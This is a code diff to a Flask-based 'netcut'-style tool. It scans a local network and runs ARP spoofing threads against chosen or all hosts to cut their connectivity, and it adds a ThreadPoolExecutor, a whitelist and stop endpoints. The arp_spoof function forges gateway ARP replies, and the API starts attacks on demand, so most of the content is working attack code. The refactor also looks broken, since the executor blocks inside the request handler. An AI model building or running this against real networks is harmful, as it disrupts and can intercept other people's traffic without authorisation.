@@ -8,19 +8,19 @@ import json
 import os
 import pythoncom
 import time
+from concurrent.futures import ThreadPoolExecutor
 
 app = Flask(__name__)
-CORS(app)  # Enable CORS for the entire app
+CORS(app)
 
 # File paths for JSON storage
 interfaces_file_path = 'network_interfaces.json'  # For network interfaces
 json_file_path = 'network_devices.json'  # For scanned network devices
 whitelist_file_path = 'ip_whitelist.json'  # For IP whitelist
 
-# List to store active threads and events for ARP spoofing
-active_threads = []
+# Global state management
 stop_events = []
-target_ips_list = []  # Shared list to hold target IPs
+target_ips_list = []
 
 def ensure_json_file_exists(file_path, initial_data):
     """Ensure the JSON file exists; if not, create it with initial data."""
@@ -32,12 +32,10 @@ def list_network_interfaces():
     pythoncom.CoInitialize()  # Initialize COM for WMI access
     c = wmi.WMI()
     interfaces = []
-    
     for interface in c.Win32_NetworkAdapterConfiguration(IPEnabled=True):
         name = interface.Description
         guid = interface.SettingID
         interfaces.append({"name": name, "guid": guid})
-    
     return interfaces
 
 def save_interfaces_to_json():
@@ -56,11 +54,9 @@ def load_interfaces_from_json():
 
 def get_gateway_and_netmask(interface_guid):
     iface_info = netifaces.ifaddresses(interface_guid)
-    
     gateway_info = netifaces.gateways()
     gateway_ip = gateway_info['default'][netifaces.AF_INET][0]
     netmask = iface_info[netifaces.AF_INET][0]['netmask']
-    
     ip_range = f"{gateway_ip}/{netmask_to_cidr(netmask)}"
     return ip_range, gateway_ip
 
@@ -75,7 +71,7 @@ def get_local_ip(interface_guid):
 def scan_network(ip_range, local_ip, gateway_ip):
     devices = []
     whitelist = load_whitelist_from_json()
-    for _ in range(3):
+    for _ in range(3):  # Reduce the number of scan iterations to avoid overload
         arp_request = ARP(pdst=ip_range)
         broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
         arp_request_broadcast = broadcast / arp_request
@@ -88,16 +84,14 @@ def scan_network(ip_range, local_ip, gateway_ip):
     
     # Save the scanned devices to a JSON file
     update_devices_in_json(devices)
-    
     return devices
+
 def load_devices_from_json():
     """Load the list of scanned devices from a JSON file."""
     ensure_json_file_exists(json_file_path, [])
     with open(json_file_path, 'r') as json_file:
         devices = json.load(json_file)
-    print("Loaded devices:", devices)  # Debug log
     return devices
-
 
 def update_devices_in_json(new_devices):
     ensure_json_file_exists(json_file_path, [])  # Ensure the JSON file exists
@@ -112,17 +106,10 @@ def update_devices_in_json(new_devices):
         json.dump(existing_devices, json_file, indent=4)
 
 def force_stop_all_spoofing():
-    global stop_events, active_threads
+    global stop_events
     for stop_event in stop_events:
         stop_event.set()  # Signal to stop the thread
-    
-    # Wait for all threads to finish
-    for thread in active_threads:
-        if thread.is_alive():
-            thread.join(timeout=1)  # Timeout to forcefully join threads
 
-    # Clear the list of threads and events after stopping
-    active_threads.clear()
     stop_events.clear()
     print("Force stopped all ARP spoofing threads due to error.")
 
@@ -135,16 +122,14 @@ def arp_spoof(target_ip, gateway_ip, stop_event):
         while not stop_event.is_set():
             arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
             send(arp_response, verbose=False)
+            time.sleep(1)  # Prevent flooding the network too quickly
 
     except Exception as e:
-        # If an error occurs, force stop all ARP spoofing
         print(f"Error during ARP spoofing: {e}")
         force_stop_all_spoofing()
 
     finally:
-        # Restore the network after ARP spoofing is stopped
         restore_network(target_ip, gateway_ip)
-
 
 def get_mac(ip):
     arp_request = ARP(pdst=ip)
@@ -178,41 +163,9 @@ def periodic_scan_and_update(interface_guid, gateway_ip):
             target_ips_list[:] = new_target_ips  # Safely update the shared list
         time.sleep(60)  # Wait for 1 minute before re-scanning
 
-def arp_spoofing_manager(gateway_ip, num_threads):
-    global stop_events, active_threads
-    while True:
-        with threading.Lock():
-            current_target_ips = list(target_ips_list)  # Safely copy the shared list
-
-        # Stop all previous spoofing threads
-        for stop_event in stop_events:
-            stop_event.set()
-
-        for thread in active_threads:
-            if thread.is_alive():
-                thread.join()
-
-        # Clear previous threads and events
-        stop_events.clear()
-        active_threads.clear()
-
-        # Create new threads for current target IPs
-        stop_events = [threading.Event() for _ in range(len(current_target_ips))]
-
-        for _ in range(num_threads):
-            for ip, stop_event in zip(current_target_ips, stop_events):
-                thread = threading.Thread(target=arp_spoof, args=(ip, gateway_ip, stop_event))
-                thread.start()
-                active_threads.append(thread)
-
-        time.sleep(360)  # Sleep before checking for new IPs again
 @app.route('/start_netcut', methods=['POST'])
 def api_start_netcut():
-    global active_threads, target_ips_list
-
-    # Check if there are already active threads running
-    if any(thread.is_alive() for thread in active_threads):
-        return jsonify({"error": "ARP spoofing attack is already running. Stop it before starting a new one."}), 400
+    global stop_events, target_ips_list
 
     data = request.get_json()
 
@@ -256,15 +209,11 @@ def api_start_netcut():
     else:
         target_ips_list = [ip.strip() for ip in target_ips]  # Clean IPs if specific IPs are provided
 
-    # Debug log to check the target IPs loaded
-
     # Filter out whitelisted IPs
     filtered_ips_list = [ip for ip in target_ips_list if ip not in whitelist]
 
     # Remove duplicates from the filtered list
     filtered_ips_list = list(set(filtered_ips_list))
-
-    # Debug log to check the filtered IPs
 
     if not filtered_ips_list:
         return jsonify({
@@ -276,15 +225,17 @@ def api_start_netcut():
     if target_ips == "all":
         threading.Thread(target=periodic_scan_and_update, args=(selected_interface_guid, gateway_ip)).start()
 
-    # Start the ARP spoofing manager thread
-    threading.Thread(target=arp_spoofing_manager, args=(gateway_ip, num_threads)).start()
+    # Use ThreadPoolExecutor with custom number of threads
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        stop_events = [threading.Event() for _ in range(len(filtered_ips_list))]
+        for ip, stop_event in zip(filtered_ips_list, stop_events):
+            executor.submit(arp_spoof, ip, gateway_ip, stop_event)
 
     return jsonify({
         "status": f"ARP spoofing attack started on {len(filtered_ips_list)} selected IPs with {num_threads} threads",
         "whitelist": whitelist,
         "affected_ips": filtered_ips_list
-    })
-
+    }),200
 
 def load_whitelist_from_json():
     """Load the IP whitelist from a JSON file."""
@@ -311,22 +262,11 @@ def remove_ip_from_whitelist(ip):
 
 @app.route('/whitelist', methods=['POST'])
 def add_to_whitelist():
-    global stop_events, active_threads
+    global stop_events
     
     # Check if there are active spoofing threads
-    if any(thread.is_alive() for thread in active_threads):
-        # Stop all active spoofing threads
-        for stop_event in stop_events:
-            stop_event.set()  # Signal the event to stop the thread
-
-        # Wait for all threads to finish
-        for thread in active_threads:
-            if thread.is_alive():
-                thread.join()
-
-        # Clear the list of threads and events after stopping
-        active_threads.clear()
-        stop_events.clear()
+    if any(thread.is_alive() for thread in threading.enumerate()):
+        force_stop_all_spoofing()
 
     data = request.get_json()
     ips = data.get('ip')
@@ -360,22 +300,11 @@ def add_to_whitelist():
 
 @app.route('/whitelist', methods=['DELETE'])
 def remove_from_whitelist():
-    global stop_events, active_threads
+    global stop_events
     
     # Check if there are active spoofing threads
-    if any(thread.is_alive() for thread in active_threads):
-        # Stop all active spoofing threads
-        for stop_event in stop_events:
-            stop_event.set()  # Signal the event to stop the thread
-
-        # Wait for all threads to finish
-        for thread in active_threads:
-            if thread.is_alive():
-                thread.join()
-
-        # Clear the list of threads and events after stopping
-        active_threads.clear()
-        stop_events.clear()
+    if any(thread.is_alive() for thread in threading.enumerate()):
+        force_stop_all_spoofing()
 
     data = request.get_json()
     ips = data.get('ip')
@@ -413,12 +342,10 @@ def get_whitelist():
     whitelist = load_whitelist_from_json()
     return jsonify(whitelist)
 
-# New Endpoint: Scan Network Interfaces and Save to JSON
 @app.route('/scan_interfaces', methods=['GET'])
 def scan_interfaces():
-    save_interfaces_to_json()  # Save the scanned interfaces to a JSON file
+    save_interfaces_to_json()
     return jsonify({"status": "Success Scan interfaces"}), 200
-
 
 @app.route('/interface_data', methods=['GET'])
 def get_interface_data():
@@ -435,7 +362,6 @@ def get_scan_network():
     with open(json_file_path, 'r') as json_file:
         devices = json.load(json_file)
     return jsonify(devices)
-
 
 @app.route('/scan_network', methods=['GET'])
 def api_scan_network():
@@ -454,41 +380,14 @@ def api_scan_network():
 
 @app.route('/stop_netcut', methods=['POST'])
 def api_stop_netcut():
-    global stop_events, active_threads
-    # Stop all active threads
-    for stop_event in stop_events:
-        stop_event.set()  # Set event to stop the thread
-    
-    # Wait for all threads to finish
-    for thread in active_threads:
-        if thread.is_alive():
-            thread.join()
-
-    # Clear the list of threads and events after stopping
-    active_threads.clear()
-    stop_events.clear()
-
+    force_stop_all_spoofing()
     return jsonify({"status": "ARP spoofing attack stopped for all IPs"})
 
 @app.route('/force_stop_netcut', methods=['POST'])
 def api_force_stop_netcut():
-    global stop_events, active_threads
-    # Force stop all active threads
-    for stop_event in stop_events:
-        stop_event.set()  # Set event to stop the thread
-    
-    # Wait for all threads to finish
-    for thread in active_threads:
-        if thread.is_alive():
-            thread.join(timeout=1)  # Timeout to forcefully join threads
-
-    # Clear the list of threads and events after stopping
-    active_threads.clear()
-    stop_events.clear()
-
+    force_stop_all_spoofing()
     return jsonify({"status": "ARP spoofing attack forcefully stopped and session cleared"}), 200
 
-# Help Endpoint
 @app.route('/help', methods=['GET'])
 def api_help():
     help_info = {
